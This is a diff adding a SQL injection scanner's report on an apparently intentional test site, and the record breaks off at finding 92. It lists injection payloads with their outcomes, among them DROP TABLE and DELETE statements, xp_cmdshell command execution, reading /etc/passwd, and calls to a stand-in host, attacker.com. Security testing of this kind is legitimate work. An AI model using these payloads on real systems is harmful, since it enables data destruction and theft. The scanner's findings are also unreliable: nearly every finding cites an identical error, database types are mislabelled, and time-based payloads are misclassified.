@@ -1,0 +1,2400 @@
+======================================================================
+SQL Injection Scan Report
+======================================================================
+
+Target URL: http://testphp.vulnweb.com/artists.php?artist=1
+Scan Date: 2026-01-19 13:20:33
+
+----------------------------------------------------------------------
+SCAN STATISTICS
+----------------------------------------------------------------------
+Total Payloads Tested: 226
+Total Vulnerabilities: 214
+Unique Vulnerable Params: 1
+Scan Duration: 45.60 seconds
+Request Rate: 4.96 req/sec
+
+----------------------------------------------------------------------
+VULNERABILITY SUMMARY
+----------------------------------------------------------------------
+
+By Severity:
+  Critical (90-100% confidence): 206
+  High (70-89% confidence):      2
+  Medium (50-69% confidence):    6
+  Low (<50% confidence):         0
+
+By Database Type:
+  mysql: 206
+  unknown: 8
+
+By Injection Type:
+  error_based: 79
+  boolean_based: 22
+  time_based: 31
+  union_based: 29
+  stacked_queries: 17
+  waf_bypass: 27
+  oob_detection: 9
+
+----------------------------------------------------------------------
+DETAILED FINDINGS
+----------------------------------------------------------------------
+
+[1] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.025s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[2] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: "
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.038s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[3] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: " OR "1"="1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[4] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.052s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[5] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: " OR 1=1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[6] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[7] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR '1'='1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.055s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[8] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: " OR 1=1#
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[9] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: "--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.072s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[10] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ') OR ('1'='1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[11] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ") OR ("1"="1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[12] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1#
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.033s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[13] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: admin'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.026s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[14] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1" OR "1"="1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.033s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[15] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' OR '1'='1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.043s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[16] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,NULL--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.025s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[17] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,NULL,NULL--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[18] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.035s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[19] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: admin"--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.053s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[20] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' OR '1'='1'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.025s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[21] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' OR '1'='1'/*
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.035s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[22] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1 LIMIT 1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.033s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[23] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 1=CONVERT(int,(SELECT @@version))--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[24] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ') OR 1=1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.030s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[25] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1)) OR ((1=1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.030s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[26] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 1=1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[27] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 1=2--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[28] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND '1'='1
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[29] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND '1'='2
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[30] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; WAITFOR DELAY '0:0:5'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[31] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT SLEEP(5)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[32] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1; WAITFOR DELAY '0:0:5'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[33] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR SLEEP(5)#
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[34] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ') OR SLEEP(5)#
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[35] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: " OR SLEEP(5)#
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.028s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[36] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND SLEEP(5)#
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[37] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT pg_sleep(5)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[38] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR pg_sleep(5)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[39] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND BENCHMARK(5000000,MD5('test'))--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[40] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[41] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' RLIKE SLEEP(5)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[42] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[43] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' waitfor delay '0:0:5'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[44] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 1=(SELECT COUNT(*) FROM tablenames); --
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[45] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1)) waitfor delay '0:0:5'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.024s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[46] MEDIUM - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 UNION ALL SELECT NULL,NULL,NULL,NULL--
+    Type: error_based
+    Database: unknown
+    Confidence: 60%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: Response length changed by 66.6%
+
+[47] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION ALL SELECT NULL,NULL,NULL,NULL--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[48] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' UNION SELECT @@version--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[49] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT user()--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[50] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT database()--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[51] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' UNION SELECT NULL,table_name FROM information_schema.tables--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[52] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,column_name FROM information_schema.columns--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[53] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' ORDER BY 1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[54] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' ORDER BY 2--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[55] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' ORDER BY 3--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[56] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' ORDER BY 5--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[57] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' ORDER BY 10--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[58] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' ORDER BY 100--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[59] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' GROUP BY 1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[60] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' GROUP BY 1,2--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[61] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' GROUP BY columnnames HAVING 1=1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[62] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' HAVING 1=1--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[63] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; INSERT INTO users VALUES('hacker','password')--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[64] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; UPDATE users SET password='hacked'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[65] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DROP TABLE users--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[66] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DELETE FROM users--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[67] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR username LIKE '%
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.013s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[68] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1; EXEC xp_cmdshell('dir')--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[69] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+    Type: error_based
+    Database: mysql
+    Confidence: 100%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[70] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[71] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND (SELECT SUBSTRING(username,1,1) FROM users)='a'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[72] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT LOAD_FILE('/etc/passwd')--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[73] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' INTO OUTFILE '/tmp/test.txt'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[74] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' INTO DUMPFILE '/tmp/test.txt'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[75] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ||UTL_HTTP.REQUEST('http://attacker.com/')||
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[76] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR UTL_HTTP.REQUEST('http://attacker.com/')--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[77] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC sp_executesql N'SELECT 1'--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[78] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1; EXEC('sel'+'ect @@version')--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[79] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DECLARE @q NVARCHAR(4000);SET @q='';EXEC(@q)--
+    Type: error_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[80] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 1=1--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[81] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 1=2--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[82] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 'a'='a
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[83] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND 'a'='b
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[84] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[85] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=2--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.027s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[86] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND 1=1--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[87] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND 1=2--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.023s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[88] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1') AND 1=2--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[89] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1') AND 1=1--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[90] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1)) AND 1=1--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[91] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1)) AND 1=2--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[92] CRITICAL - artist
